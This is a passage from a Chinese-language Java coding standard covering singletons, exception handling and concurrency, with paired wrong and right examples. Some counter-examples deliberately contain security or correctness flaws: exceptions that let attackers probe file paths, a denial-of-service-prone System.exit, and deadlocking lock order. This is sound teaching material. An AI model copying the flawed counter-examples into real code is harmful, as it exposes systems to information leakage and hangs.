class UntrustedSingletonDemo implements Cloneable {
    private static UntrustedSingletonDemo instance;

    private UntrustedSingletonDemo() {
    }

    public static synchronized UntrustedSingletonDemo getInstance() {
        if (instance == null) {
            instance = new UntrustedSingletonDemo();
        }
        return instance;
    }
}
```

【正例】（利用枚举实现单例）

```java
enum RecommandSingleton {
    SINGLETON;

    public void doSomething() {
    }
}
```

提示：利用枚举实现单例时，枚举类的静态成员变量的初始化在构造方法之后执行，构造方法中不要操作静态成员变量。

【正例】（利用静态内部类实现单例）

```java
final class RecommandSingleton {
    private static class SingletonHolder {
        static final RecommandSingleton INSTANCE = new RecommandSingleton();
    }

    private RecommandSingleton() {
    }

    public static RecommandSingleton getInstance() {
        return SingletonHolder.INSTANCE;
    }
}
```

【正例】（利用Spring的依赖注入能力实现单例（其他诸如Guice、Dagger等也可以实现））

```java
@Component
class RecommandSingleton {
    public void doSomething() {
    }
}

@Component
class SomeServiceImpl {
    private final RecommandSingleton singleton;

    @Autowired
    public SomeServiceImpl(RecommandSingleton singleton) {
        this.singleton = singleton;
    }
}
```

除上述三种方式外，还可以利用双重检查锁实现单例模式，可参考避免使用不正确形式的双重检查锁。

> G.OBJ.09 使用类名调用静态方法，而不要使用实例或表达式来调用

【级别】 要求

【描述】

明确地使用类名调用静态方法不容易造成混淆。使用实例调用静态方法时，调用的静态方法是声明类型的静态方法，与实例的实际类型无关，可能会导致与预期的结果不一致。当父类和子类有同名静态方法时，声明父类变量引用子类实例，使用该实例调用同名的静态方法调用的是父类的静态方法，而非子类的静态方法。类的静态属性也要使用类名进行调用。

【反例】

```java
class Dog {
    public static void bark() {
        System.out.println("woof");
    }
}

class Basenji extends Dog {
    public static void bark() {
        System.out.println("miao");
    }
}

public class Bark {
    public static void main(String[] args) {
        Dog woofer = new Dog();
        Dog nipper = new Basenji();
        woofer.bark();
        nipper.bark();
    }
}
```

上述示例中，对 `bark()` 的两次调用，实际调用的都是 `Dog.bark()` 方法。

【正例】（用类名来调用静态方法）

```java
class Dog {
    public static void bark() {
        System.out.print("woof");
    }
}

class Basenji extends Dog {
    public static void bark() {
        System.out.println("miao");
    }
}

public class Bark {
    public static void main(String[] args) {
        Dog.bark();
        Basenji.bark();
    }
}
```

#### 3.6.2 接口

对于函数式接口应添加`@FunctionalInterface`注解。

> G.OBJ.10 接口定义中去掉多余的修饰词

【级别】 建议

【描述】

在接口定义中，属性已默认具有`public static final`修饰词，方法已默认具有`public abstract`修饰词。因此在代码中不要再次提供这些修饰词。

> G.OBJ.11 可在接口中加上静态方法表示相关的工厂或助手方法

【级别】 建议

【描述】

推荐在接口中添加静态方法表示相关的工厂或助手方法，这样不需要在`接口名字+s`的工具类/助手类 中放置各种静态方法了。

例如可以把`Collections`的方法放到`Collection`接口里面。

### 3.7 异常处理

对可容错处理的情况使用受检异常（checked exception），对编程错误使用运行时异常（runtime exception）。

对于可通过预检查方式规避的运行时异常，不应该通过try catch机制进行处理，如`NullPointerException`、`IndexOutOfBoundsException`等。

只针对真正异常的情况才使用exception机制，异常机制不应用来做正常的程序控制流程。

在抛出异常的细节信息中，应包含详细的诊断信息。

使用异常来做业务逻辑错误处理，而非错误码。

> G.ERR.01 不要通过一个空的catch块忽略异常

【级别】 要求

【描述】

异常表示程序运行发生了错误，发生异常会中断程序的正常处理流程。不应该使用空的catch块会忽略发生的异常，发生异常要么在catch块中对异常情况进行处理，要么将异常抛出，交由上层调用方进行处理。

【反例】

```java
try {
	...
} catch (SomeException ex) {
}
```

【例外】

对于释放资源类操作中发生的异常，可以被忽略。释放资源类操作一般是在finally代码段中执行，发生异常只会导致资源没有被释放，不会对程序产生其他影响，不需要执行任何恢复动作。为了表明忽略这类异常是经过深思熟虑的，可采用如下措施：

- 在catch块中添加注释，解释为什么可以忽略这个异常；
- 对于那些不应该频繁发生的异常，应该将异常信息记录到日志中；
- 对于被忽略的异常，建议将被忽略的Exception命名为ignored。

> G.ERR.02 不要直接捕获异常的基类`Throwable`、`Exception`、`RuntimeException`

【级别】 建议

【描述】

捕获异常的目的是为了将程序从异常状态恢复或对异常进行针对性处理，而如果不加区分的直接捕获基类异常，则会忽略程序抛出的异常类型，无法对各类异常进行有针对性地恢复处理，另外不利于代码的可读性、可维护性。

当程序中的多种异常使用同一逻辑进行处理时，可以用并语法 `(ExceptionType1 | ... | ExceptionTypeN 变量)` 来减少重复代码。

【反例】

```java
try {
    doSomething();
} catch (Exception ex) {
    handleException(ex);
}
```

上述代码中，直接处理了基类异常`Exception`，没有对不同异常进行有区分的处理。

【正例】

```java
try {
    doSomething();
} catch (ParseException ex) {
    handleParseException(ex);
} catch (IOException ex) {
    handleIOException(ex);
}
```

上述示例中，对于`ParseException`、`IOException`两类异常分别进行了对应地处理。

【正例】

```java
try {
    doSomething();
} catch (ParseException | IOException ex) {
    handleException(ex);
}
```

上述示例中，对于`ParseException`和`IOException` 两类异常处理逻辑相同时，使用并语法在同一 catch块 中处理两类异常。

【正例】

```java
try {
    doSomething();
} catch (ParseException ex) {
    handleParseException(ex);
} catch (IOException ex) {
    handleIOException(ex);
} catch(Exception ex) {
    handleOtherException(ex);
}
```

上述示例中，当doSomething方法会处理一些复杂的业务逻辑，除了`ParseException`和`IOException`两类异常外，还有可能抛出其他一些运行时异常，为了增加系统的健壮性，在处理完`ParseException`和`IOException`两类明确的异常后，使用`Exception`对其他一些异常进行了兜底处理。

【例外】

1. 编码过程中遇到了第三方api直接抛出`Exception`异常，代码中需要使用`catch (Exception ex)`。
2. 在框架中属于“公共服务”性质的“兜底”处理，例如事件循环、线程结束时的异常处理。

> G.ERR.03 不要直接捕获可通过预检查进行处理的`RuntimeException`，如`NullPointerException`、`IndexOutOfBoundsException`等

【级别】 建议

【描述】

可通过预检查的方式进行消除的`RuntimeException`，这类异常一般表示程序逻辑错误，不应该通过`try...catch`的方式进行处理（这也可能会影响代码的可读性及系统的运行效率）。推荐通过预检查 方式进行消除，该类运行期异常包括：`NullPointerException`、`IndexOutOfBoundsException`等。对于`NumberFormatException`、`IllegalArgumentException`、`IllegalStateException`等可通过`try...catch`方式处理。

【反例】

```java
public boolean validateUntrustInput(String paramValue) {
    try {
        if (paramValue.length() < 6 || paramValue.length() > 20) {
            return false;
        }
        ...
        return true;
    } catch (NullPointerException ex) {
        return false;
    }
}
```

上述示例中，`validateUntrustInput()`方法对数据进行校验时，没有主动判断参数是否为null，而是通过捕获`NullPointerException`的方式处理。

【正例】（代码中显式判空）

```java
public boolean validateUntrustInput(String paramValue) {
    if (paramValue == null) {
        return false;
    }
    if (paramValue.length() < 6 || paramValue.length() > 20) {
        return false;
    }
    ...
    return true;
}
```

上述示例中，`validateUntrustInput()`方法中明确检查了参数是否为null，而不是通过捕获`NullPointerException`进行处理。

【例外】

对于调用开源三方件，三方件中抛出`NullPointerException`、`IndexOutOfBoundsException`等异常时，可以通过`try...catch`方式进行处理。

> G.ERR.04 防止通过异常泄露敏感信息

【级别】 要求

【描述】

程序抛出的异常中，可能会包含一些敏感信息，将这些异常直接记录到日志或反馈给用户，会导致敏感信息泄露风险。

另外，即使异常中不含敏感信息，但是直接将异常反馈给用户，该动作本身可能就会导致敏感信息泄露风险，比如系统访问用户指定的文件路径，当该路径不存在时，系统给用户反馈一个过 滤了敏感信息的异常，恶意用户可以根据系统是否抛出异常来构造文件路径，达到对系统的文件目录结构进行探测的目的。

附录C 敏感异常 列出了一些常见的需要注意的Java原生异常类型，除此之外，三方件也可能会抛出携带敏感信息的异常，如`JSONException`等。

【反例】（异常消息和类型泄露敏感信息）

```java
public static String readFile(String filePath) throws IOException {
    FileInputStream fileInputStream;
    try {
        fileInputStream = new FileInputStream(filePath);
        ...
    } catch (FileNotFoundException ex) {
        throw new IOException("Unable to retrieve file.", ex);
    }
    ...
}
```

上述示例中，当请求的文件不存在时，`FileInputStream`的构造器会抛出`FileNotFoundException`，导致`readFile`方法抛出`FileNotFoundException`或`IOException`异常。当`readFile`抛出的异常可被外部用户获取到时，恶意用户可以通过不断传入指定的文件路径来探测底层文件系统结构。

```java
public static String readFile(String filePath) throws MyBizException {
    ...
    try {
        fileInputStream = new FileInputStream(filePath);
        ...
    } catch (FileNotFoundException ex) {
        LOGGER.error(bizExceptionHandle(ex)); // 在日志中记录过滤后的异常信息
        throw new MyBizException("...");
    }
    ...
}
```

上述示例中，抛出的异常中泄露的有用信息较少，但是如果用户可以直接获取 `readFile` 方法抛出的异常时，恶意用户仍可以根据是否抛出异常来对底层文件系统结构进行探测。

【正例】

```java
// filePath、directory已经规范化处理
public static String readFile(String filePath, String directory) throws MyBizException {
    if (!filePath.startsWith(directory)) {
        throw new MyBizException("Invalid file ...");
    }
    ...
    try {
        fileInputStream = new FileInputStream(filePath);
        ...
    } catch (FileNotFoundException ex) {
        LOGGER.error("Invalid file ...");
        throw new MyBizException("Invalid file ...");
    }
    ...
}
```

上述示例中，限制 `readFile` 只能访问指定根目录下的文件，当访问指定目录之外的文件时，统一抛出 `MyBizException` 异常，这样可以有效避免恶意用户对底层文件系统结构的探测。

【正例】

```java
// filePath、filePathList已经规范化处理
public static String readFile(String filePath, List<String> filePathList) throws MyBizException {
    if (!filePathList.contains(filePath)) {
        throw new MyBizException("Invalid file ...");
    }
    ...
    try {
        fileInputStream = new FileInputStream(filePath);
    } catch (FileNotFoundException ex) {
        LOGGER.error("Invalid file ...");
        throw new MyBizException("Invalid file ...");
    }
    ...
}
```

上述示例中，使用文件白名单限制 `readFile` 可访问的文件列表，当访问非白名单内的文件时，统一抛出 `MyBizException` 异常，这样可以有效消除恶意用户对底层文件系统结构的探测。

【例外】

对出于问题定位目的，可将敏感异常信息记录到日志中，在保证足以定位问题的情况下进行脱敏处理，同时必须做好日志的访问控制，防止日志被任意访问，导致敏感信息泄露给非授权用户。

> G.ERR.05 方法抛出的异常，应该与本身的抽象层次相对应

【级别】 要求

【描述】

异常通常分为受检异常（checked exception）和运行时异常（runtime exception）。对于编程错误（即这些错误是可以通过预检查进行消除的）推荐使用运行时异常，对于需要主动对进行恢复处理的场景推荐使用受检异常。

方法抛出异常时，应该避免直接抛出 `RuntimeException` ，更不应该直接抛出 `Exception` 或 `Throwable` ，因为这些父类异常无法与异常发生的场景相关联，直接抛出父类异常会降低代码可读性。方法抛出的异常应该与方法本身的抽象层次相对应，这些异常可以是JDK中定义的标准异常，也可以是业务层自定义的异常。另外，抛出的异常中应该包含理解该异常产生原因的所有信息。

【反例】

```java
public class Employee {
    ...
    public String getSomeInfo() {
        ...
        throw new RuntimeException("xxx");
    }
    ...
}
```

上述示例中，`getSomeInfo()`在发生异常时直接抛出 `RuntimeException` ，这样处理既不利于上层调用方通过异常类型理解异常发生原因，也不利于上层调用方分类处理各种底层异常。

【正例】

```java
public class Employee {
    ...
    public String getSomeInfo() throws MyBizException{
        ...
        throw new MyBizException("xxx");
    }
    ...
}
```

上述示例中，`getSomeInfo()`抛出`MyBizException`，异常与方法的抽象层次保持一致。

> G.ERR.06 在catch块中抛出新异常时，避免丢失原始异常信息

【级别】 建议

【描述】

在catch代码块中更改异常类型时，如果只是使用原始异常中的 message（`originalException.getMessage()`）或新的错误描述构造新异常，可能会导致原始异常中的有价值的信息丢失，例如异常类型、调用堆栈等信息，增加问题定位的难度。 原始异常含敏感信息时，可先对敏感信息进行匿名化处理。

【反例】

```java
public void loadConfigFile() throws MyBizDomainException {
    ...
    try {
        ...
    } catch (IOException ex) {
        throw new MyBizDomainException("Lost original exception message");
    }
}
```

上述示例中，在捕获 `IOException` 后，首先将 `IOException` 记录到日志中，然后抛出一个新的与业务代码相对应的异常。

【正例】

```java
public void loadConfigFile() throws MyBizDomainException {
    ...
    try {
        ...
    } catch (IOException ex) {
        // 新异常中携带原始异常信息
        throw new MyBizDomainException(ex.getMessage(), bizExceptionHandle(ex));
    }
}
```

上述示例中，在捕获 `IOException` 后，基于 `IOException` 构造了一个与业务代码相对应的异常。`bizExceptionHandle` 可根据实际情况对异常进行清理、过滤。

【例外】

对于异常中的堆栈本身就属于敏感信息，可在新抛出异常中的message中对原始异常进行概述。

> G.ERR.07 一个方法不应抛出超过5类异常，并在Javadoc的@throws标签中记录 每类异常

【级别】 建议

【描述】

方法抛出过多的异常，会增加上层调用方法中的异常处理的工作，同时也表明方法承担了过多的职责， 推荐一个方法最多抛出5类异常，包括受检异常和运行时异常。

应用在Javadoc中的@throws标签中为方法抛出的所有异常建立文档，准确记录各类异常抛出的条件。 运行时异常一般是由于程序错误导致的，为运行时异常添加文档说明，可以有效避免方法调用时出现这 些错误。

方法声明中只需要throws受检异常，方便调用方法明确区分哪些是受检异常，哪些是运行异常，保障正确处理异常与程序错误。方法声明中throws的异常必须是方法实际会抛出的异常，防止上层调用方法处理实际不会抛出的异常。

> G.ERR.08 不要使用`return`、`break`、`continue`或抛出异常使finally块非正常结束

【级别】 要求

【描述】

在finally代码块中，直接使用`return`、`break`、`continue`、`throw`语句，或由于调用方法的异常未处理，会导致finally代码块无法正常结束。非正常结束的finally代码块会影响try或catch代码块中异常的抛出，也可能会影响方法的返回值。所以要保证finally代码块正常结束。

【反例】

```java
public static void main(String[] args) {
    try {
        System.out.println(func());
    } catch (MyException ex) {
        // 处理异常
    }
}

public static int func() throws MyException {
    for (int i = 1; i < 2; i++) {
        try {
            throw new MyException();
        } finally {
            continue; // 不推荐
        }
    }
    return 0;
}
```

上述示例中，main方法中不会捕获到异常，而是直接输出0。

> G.ERR.09 不要调用 `System.exit()` 终止JVM

【级别】 建议

【描述】

`System.exit()` 会结束当前正在运行的Java虚拟机（JVM），导致拒绝服务攻击。例如，在某个web请求的处理逻辑中调用 `System.exit()` ，会导致web容器停止运行。系统中应避免无意和恶意地调用 `System.exit()` 。

【反例】

```java
public static void main(String[] args) {
    System.exit(1);
    LOGGER.info("exit");
}
```

上述示例中，使用 `System.exit()` 来强制关闭JVM并终止运行中的进程。

【正例】

```java
public static void main(String[] args) {
    LOGGER.info("exit");
}
```

上述示例中，`main()`方法正常退出，结束进程。

【例外】

在命令行应用中调用`System.exit()`方法是允许的。

> G.ERR.10 尽量消除非受检的异常，不应该在整个类上使用SuppressWarning

【级别】 建议

【描述】

在源代码中通过 `@SuppressWarning("unchecked")` 屏蔽告警，是个坏的实践。它丢失了类型安全和描述性的好处。

然而有些Java API，是用 `Object obj` 来存储数据对象的，当数据被取出来用时，不得不转换为用户数据对象。这时可能会有强制类型转换的告警，例如：`[unchecked] unchecked method invocation` 。

非受检警告很重要，不要轻易忽略它们。应该始终在最小的范围内使用`@SuppressWarning`注解，一般是在变量声明，简短的语句或方法上。每当使用SuppressWarning注解时，都要添加一条注释，说明为什么这么做是安全的，及其使用的业务场景和范围。

【例外】

类的设计可优先考虑泛型，但是有些API返回的就是Object对象，调用方不得不强制转换为用户数据对象，例如 `ObjectInputStream.readObject` ，Android `Message.obj` 等。

> G.ERR.11 对于`GeneralSecurityException`及其子类异常应记录日志

【级别】 建议

【描述】

`GeneralSecurityException`是一个一般安全异常类，其子类定义了各种跟安全相关的异常，比如加解密操作相关异常、证书验证相关异常。当系统中抛出这些异常时，表示系统中的一些安全相关的功能出现问题或遇到一些非预期的场景。所以对于这些异常建议在日志中进行详细记录，方便后续进行问题分析定位及对系统的安全性进行优化完善。这些异常中如果含有秘钥、口令等敏感信息时，记录日志前应该对这些敏感信息进行过滤。

### 3.8 并发与多线程

优先使用Java标准库提供的高级同步机制在多线程中共享数据。

针对线程安全性，需要进行文档（javadoc）说明。

可以使用`CompletableFuture`编写异步任务。

“Thinking in parallel”，可以使用stream做隐式的自动并行化，替代显式的循环。

对于锁的使用要考虑性能损耗，必须使用锁时，尽量减小加锁的范围，能锁代码块时不要对方法加锁， 能对对象加锁的不要对类加锁。

使用 `lock.tryLock()` 来尝试获取锁时，要按是否成功获取到锁进行对应的业务逻辑处理。

不推荐使用 `ThreadGroup` ，其中很多方法已经不被推荐使用，另外部分方法本身就非线程安全，可以使用线程池进行替换。

推荐优先使用不可变对象在多线程间传递信息。

JDK中的很多线程控制相关API都已经被标注为“@Deprecated”，这些方法应该禁止使用。例如有些API 可能会导致死锁问题，涉及到的API包括： `java.lang.Thread.suspend()`、 `java.lang.Thread.resume()`、 `java.lang.ThreadGroup.suspend()`、 `java.lang.ThreadGroup.resume()`、 `java.lang.ThreadGroup.allowThreadSuspension()` 等。

#### 3.8.1 可见性和原子性

`volatile`关键字可以用来保证基本数据类型的可见性，对于引用类型，可以保证引用的可见性，但不能保证引用内容的可见性。

> P.02 避免数据竞争（data race）

【描述】

Java 5开始，Java Memory Model采用**happens-before**关系，来规定并发执行中，读写操作允许读到什么值，不允许读到什么值。两个线程分别对一个非`volatile`的共享变量进行访问操作，其中至少一个操作是写操作，且这两个操作之间没有happens-before关系，就是data race。正确同步的（correctly synchronized）执行是指没有data race的执行。

通常 必须避免data race。但由于Java Memory Model在有data race的情况下也有明确的语义，如果可 以用Java Memory Model证明代码即使有data race也总能产生符合要求的结果，可以带来性能提升，且用完善的注释解释程序为什么是正确的，那么可以破例允许data race的存在。只有极个别情况（如：实现对象缓存、sloppy counter、snapshot-at-the-beginning算法等）才需要使用这个特例。

注：
*happens-before关系的正式定义见*[*Java Memory Model*](https://docs.oracle.com/javase/specs/jls/se11/html/jls-17.html#jls-17.4)*。不熟悉happens-before关系的读者可以参 考Oracle的*[*The Java Tutorials: Lesson: Concurrency*](https://docs.oracle.com/javase/tutorial/essential/concurrency/)*，其中有简明而准确的描述，且充分地强调了 happens-before关系的重要性。*
*Java Memory Model诞生的背景是，由于CPU的*[*乱序执行*](https://en.wikipedia.org/wiki/Out-of-order_execution)*以及编译器的变换，一个线程访问内存的实际 顺序会被CPU和编译器打乱，因此多个线程并发访问内存，执行的结果可能不同于任何一种“多个线程交 替执行”的结果（即，不是*[*sequentially consistent*](https://en.wikipedia.org/wiki/Sequential_consistency)*的），参见下面的“反例”。Java 1.0-1.4对于内存访问的 规范定义得很模糊，于是Java 5引入了基于happens-before关系的memory model，来精确地规定读写操 作允许看到什么值。有兴趣的读者可以阅读William Pugh整理的*[*Java Memory Model*](http://www.cs.umd.edu/~pugh/java/memoryModel/index.html)*相关资料。*

【反例】

下面的程序中，两个线程之间没有任何同步，故publisher线程里的写操作 `newFoo.nr = 42` 与 consumer线程里的 `myFoo.nr` 读操作没有happens-before关系，是data race。因此，由于CPU的乱序执行，以及编译器的变换，consumer即使看到了 `sharedFoo` 变量已赋值，看到了 `Foo` 对象已经创建， 也不保证看到成员变量 `Foo.nr` 已被赋值为42。例子中，consumer的语句(4)中读 `myFoo.nr` 的值，既有可能读到publisher写入的值42，也有可能读到初值0。

```java
class Foo {
    public int nr; // (0) 赋初值0
}

private Foo sharedFoo; // 非volatile共享变量

public void publisher() {
    ...
    Foo newFoo = new Foo();
    newFoo.nr = 42; // (1) 非volatile写
    sharedFoo = newFoo; // (2) 非volatile写
    ...
}

public void consumer() {
    ...
    Foo myFoo;
    do {
        myFoo = sharedFoo; // (3) 非volatile读
    } while (myFoo == null); // 即便这里看到了对象已经创建，下面输出的myFoo.nr也可能不是42。
    System.out.println(myFoo.nr); // (4) 这是非volatile读。可能返回初值0或42
    ...
}
```

线程间共享数据，需要使用Java提供的同步机制，如锁、volatile变量、等待线程结束（`Thread.join`）等。注意：是否正确同步的标准是“是否建立了happens-before关系”，而不是使用了上述机制。

建议按照以下顺序选取合适的同步机制：

1. 首先考虑使用阻塞队列（如`BlockingQueue`），或者其他Java标准库中提供的高级同步机制（如 executor、future等），需特别留意Java API中对各个类的happens-before关系的描述。（见 G.CON.10）
2. 其次考虑使用锁来保护共享变量。如果情形比较简单，容易保证正确，或者需要用无锁同步提高性能，可以使用`volatile`变量同步。 

- - 要注意，与C++的 `atomic<T>` 不同，Java中`volatile`变量的 `+=`、`-=`、`*=` 等复合赋值操作**不是**不可分割的原子读改写（atomic read-modify-write）操作，而是先读后写两个操作。
  - 如果需要原子读改写（atomic read-modify-write）操作，如原子自增（`getAndAdd`）、原子的`compareAndExchange`等，考虑使用`java.util.concurrent.atomic`中的原子类（如`AtomicInteger`），但不要使用带acquire、release、opaque、plain后缀的方法。

1. 如果尝试了前两条，性能仍然不理想，考虑采用更完善的无锁同步算法。如果性能仍然是问题，考虑采用 `java.util.concurrent.atomic.AtomicXxxx`中的弱顺序（weak order）的原子内存访问（acquire、release、opaque、plain）。（慎用，本文不涉及）

（以上建议参考了Hans Boehm的演讲[Using weakly ordered C++ atomics correctly](https://schd.ws/hosted_files/cppcon2016/74/HansWeakAtomics.pdf)）

【正例】

使用volatile变量同步。在下例中，volatile变量的写操作(2)和读操作(3)之间建立了happens-before关系，保证读操作(4)必然看到写操作(1)写入的42，而不是初值0。

```java
class Foo {
    public volatile int nr; // (0) 赋初值0
}

private volatile Foo sharedFoo; // volatile共享变量

public void publisher() {
    ...
    Foo newFoo = new Foo();
    newFoo.nr = 42; // (1) 写操作：写入42
    sharedFoo = newFoo; // (2) volatile写操作：写入新对象的引用
    ...
}

public void consumer() {
    ...
    Foo myFoo;
    do {
        myFoo = sharedFoo; // (3) volatile读操作：读sharedFoo里的值
    } while (myFoo == null); // 不等于null就证明(2)happens before(3)
    System.out.println(myFoo.nr); // (4) 读操作：(2)happens before(3)，返回值为42
    ...
}
```

除了volatile变量以外，还可以[使用锁同步](https://docs.oracle.com/javase/specs/jls/se11/html/jls-17.html#jls-17.4.4)或者使用 `Thread.join()` 同步。它们都可以[建立happensbefore关系](https://docs.oracle.com/javase/specs/jls/se11/html/jls-17.html#jls-17.4.4)。

**一般来说，如果使用锁，那么读和写都要加锁**，而不是写线程需要加锁，而读的线程可以不加锁。

【反例】

下面的代码，只有写线程加了锁，读线程没有加锁，导致写操作(1)和读操作(6)之间没有happensbefore关系，造成data race，(6)有可能读到 data 的初值0。

```java
int data; // (0) 写初值0
boolean flag;
Object lock;

void thread1() {
    data = 42; // (1) 写data
    synchronized (lock) { // (2) 加锁
        flag = true; // (3) 写flag
    } // (4) 解锁
}

void thread2() {
    boolean myFlag;
    do {
        myFlag = flag; // (5) 读flag
    } while (!myFlag);
    int myData = data; // (6) 读data
    System.out.println(myData); // 输出可能不是42！
}
```

著名的[双检锁(double-checked locking)](https://en.wikipedia.org/wiki/Double-checked_locking)模式是一个特例。它在读线程中不加锁，只在写的时候加锁，利用此法在惰性初始化中减少锁的代价，广泛运用于单例模式的实现。在Java中，双检锁需要用`volatile`配合锁共同实现同步才能正确实现（熟练的程序员可以使用Java 9引入的acquire和release语义实现）。维基百科中有在Java中正确实现“双检锁”的例子。

#### 3.8.2 锁

> P.03 使用相同的顺序请求和释放锁来避免死锁

【描述】

当多个线程之间互相持有彼此等待的锁而又不释放自己所持有的锁时，就会发生死锁。

当程序涉及到使用多个锁对资源进行同步时，编码过程中，要仔细考虑锁的顺序，尽量以相同的顺序来 请求和释放锁，避免发生死锁。

不能为了避免死锁的发生，扩大锁的使用范围，影响系统性能。

【反例】（不同的锁次序）

```java
final class BankAccount {
    private double balanceAmount; // 银行账户中的总金额
    
    BankAccount(double balance) {
        this.balanceAmount = balance;
    }

    // 将当前账户对象的存款转寄给另一个银行账号实例ba
    private void depositAmount(BankAccount ba, double amount) {
        synchronized (this) {
            synchronized (ba) {
                if (amount > balanceAmount) {
                    throw new IllegalArgumentException(
                            "Transfer cannot be completed");
                }
                ba.balanceAmount += amount;
                this.balanceAmount -= amount;
            }
        }
    }
    
    public static void initiateTransfer(BankAccount first, BankAccount second, double amount) {
        Thread transfer = new Thread(new Runnable() {
            public void run() {
                first.depositAmount(second, amount);
            }
        });
        transfer.start();
    }
    
    public static void main(String[] args) {
        BankAccount bankA = new BankAccount(15000);
        BankAccount bankB = new BankAccount(9000);
        
        initiateTransfer(bankA, bankB, 500);
        initiateTransfer(bankB, bankA, 1400);
        ...
    }
}
```

上述示例中存在死锁的情况，当bankA和bankB两个银行账户同步互相进行转账时，就可能会导致死锁的问题。

【正例】（顺序锁）

```java
final class BankAccount implements Comparable<BankAccount> {
    private static AtomicLong nextId = new AtomicLong(0); // 下一个未使用的ID
    private double balanceAmount; // 银行账户中的总金额
    private final long id; // 每一个银行账户的id都是唯一的
    
    private BankAccount(double balance) {
        this.balanceAmount = balance;
        this.id = nextId.getAndIncrement();
    }
    
    @Override
    public int compareTo(BankAccount ba) {
        return (this.id > ba.id) ? 1 : (this.id < ba.id) ? -1 : 0;
    }
    
    // 将当前账户对象的存款转寄给另一个银行账号实例ba
    public void depositAmount(BankAccount ba, double amount) {
        BankAccount former;
        BankAccount latter;
        if (compareTo(ba) < 0) {
            former = this;
            latter = ba;
        } else {
            former = ba;
            latter = this;
        }
        
        synchronized (former) {
            synchronized (latter) {
                if (amount > balanceAmount) {
                    throw new IllegalArgumentException("XXX...");
                }
                ba.balanceAmount += amount;
                this.balanceAmount -= amount;
            }
        }
    }
    
    public static void initiateTransfer(BankAccount first, BankAccount second, double amount) {
        Thread transfer = new Thread(new Runnable() {
            @Override
            public void run() {
                first.depositAmount(second, amount);
            }
        });
        transfer.start();
    }
}
```

上述示例中，以相同的顺序获得和释放多个锁，有效避免了死锁的发生。

【正例】（`ReentrantLock`）

```java
final class BankAccount {
    private double balanceAmount; // 银行账户中的总金额
    private final Lock lock = new ReentrantLock();
    private final Random number = new Random(123L);

    BankAccount(double balance) {
        this.balanceAmount = balance;
    }

    // 将当前账户对象的存款转寄给另一个银行账号实例ba
    private void depositAmount(BankAccount ba, double amount)
            throws InterruptedException {
        while (true) {
            if (this.lock.tryLock()) {
                try {
                    if (ba.lock.tryLock()) {
                        try {
                            if (amount > balanceAmount) {
                                throw new IllegalArgumentException(
                                        "Transfer cannot be completed");
                            }
                            ba.balanceAmount += amount;
                            this.balanceAmount -= amount;
                            break;
                        } finally {
                            ba.lock.unlock();
                        }
                    }
                } finally {
                    this.lock.unlock();
                }
            }
            int n = number.nextInt(1000);
            int time = 1000 + n; // 1秒+随机时间的延迟，防止livelock
            Thread.sleep(time);
        }
    }

    public static void initiateTransfer(BankAccount first, BankAccount second, double amount) {
        Thread transfer = new Thread(new Runnable() {
            public void run() {
                try {
                    first.depositAmount(second, amount);
                } catch (InterruptedException ex) {
                    Thread.currentThread().interrupt(); // 重置中断状态
                }
            }
        });
        transfer.start();
    }
}
```

上述示例中，每个 `BankAccount` 都有一个 `ReentrantLock` 锁。此设计允许 `depositAmount()` 方法尝试获取两个帐户的锁，如果失败则释放锁，并在必要时稍后重试。

> G.CON.01 对共享变量做同步访问控制时需避开同步陷阱

【级别】 要求

【描述】

用作锁的对象声明时，必须添加`final`修饰符，防止进行多线程同步期间由于被指向其他对象导致无法正确实现同步。

**常见同步陷阱1：使用了基于高级并发对象的synchronized块**

高级并发类是指实现 `java.util.concurrent.locks` 包中的 `Lock` 或 `Condition` 接口的类，其本身提 供了 `lock` 与 `unlock` 来实现同步，不应将这些类的对象作为 `synchronized` 块的同步对象使用。当使用基于高层并发对象的 `synchronized` 块时，容易被误认为这种方式与正常使用 `lock` 接口的方式是同一个锁，而实际是两个不同的锁，会导致无法实现同步控制。

【反例】

```java
public class SomeSharedResource {
    private final Lock lock = new ReentrantLock();
    
    public void updateResource() {
        synchronized (lock) {
            // 更新共享的资源
            ...
        }
    }
    
    public void doSomething() {
        lock.lock();
        try {
            // 更新共享的资源
            ...
        } finally {
            lock.unlock();
        }
    }
}
```

上述示例中，`updateResource()` 和 `doSomething()` 方法中使用不是同一个锁。

【正例】

```java
public class SomeSharedResource {
    private final Lock lock = new ReentrantLock();
    
    public void updateResource() {
        lock.lock();
        try {
            // 更新共享的资源
            ...
        } finally {
            lock.unlock();
        }
    }
    
    public void doSomething() {
        lock.lock();
        try {
            // 更新共享的资源
            ...
        } finally {
            lock.unlock();
        }
    }
}
```

**常见同步陷阱2：使用实例锁来同步静态共享变量**

实例锁的同步效果仅限于此实例本身，无法用来同步静态共享变量；如果试图使用实例锁来同步静态共 享变量，在多实例情况下无法实现符合预期的同步效果。

【反例】

```java
public class SomeSharedResource {
    private static volatile int counter;
    private final Object lock = new Object();
    public void updateResource() {
        synchronized (lock) {
            counter++;
        }
    }
}
```

【正例】

```java
public class SomeSharedResource {
    private static volatile int counter;
    private static final Object lock = new Object();
    public void updateResource() {
        synchronized (lock) {
            counter++;
        }
    }
}
```

**常见同步陷阱3：使用可被重用的对象锁**

如果使用可被重用的对象作为同步对象，容易导致不同的共享变量实际依赖了同一个锁，无法实现符合预期的同步效果。常见的可被重用的对象包括Boolean、封包的Integer对象、String常量等。

【反例】

```java
public class SomeSharedResource {
    private final String lock = "lock";
    
    public void updateResource() {
        synchronized (lock) {
            // 更新共享的资源
            ...
        }
    }
}
```

【正例】（使用不可被重用的对象）

```java
public class SomeSharedResource {
    private final Object lock = new Object();
    public void updateResource() {
        synchronized (lock) {
            // 更新共享的资源
            ...
        }
    }
}
```

**常见同步陷阱4：使用class类对象锁**

如果使用class类对象作为同步对象，父子类继承关系增加了class类对象归属的复杂度，开发人员容易犯错，导致同步行为不符合预期；故应避免使用class这类容易造成歧义的对象，而应使用明确的对象。

【反例】

```java
// 示例1
public class SomeSharedResource {
    public static void updateResource() {
        synchronized (SomeSharedResource.class) {
            // 更新共享的资源
            ...
        }
    }
}

// 示例2
public class SomeSharedResource {
    public void updateResource() {
        synchronized (this.getClass()) {
            // 更新共享的资源
            ...
        }
    }
}
```

【正例】（使用明确的锁对象）

```java
public class SomeSharedResource {
    private final Object lock = new Object();
    public void updateResource() {
        synchronized (lock) {
            // 更新共享的资源
            ...
        }
    }
}
```

> G.CON.02 在异常条件下，保证释放已持有的锁

【级别】 要求

【描述】

